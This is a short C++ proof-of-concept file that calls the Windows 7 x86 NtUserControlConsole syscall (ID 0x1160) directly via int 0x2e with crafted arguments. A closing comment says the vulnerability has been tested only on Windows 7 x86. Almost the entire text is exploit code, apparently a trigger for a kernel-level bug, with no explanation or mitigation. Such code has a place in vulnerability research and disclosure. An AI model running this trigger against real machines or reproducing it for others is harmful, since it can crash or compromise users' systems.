#include <Windows.h>

extern "C"

ULONG CDECL SystemCall32(DWORD ApiNumber, ...) 
{
__asm{mov eax, ApiNumber};
__asm{lea edx, ApiNumber + 4};
__asm{int 0x2e};
}


int _tmain(int argc, _TCHAR* argv[])
{

int st = 0;
int syscall_ID = 0x1160; //NtUserControlConsole ID Windows 7

LoadLibrary(L"user32.dll");

st = (int)SystemCall32(syscall_ID, 4, 0, 8);

return 0;
}

# The vulnerability has only been tested  in Windows 7 x86.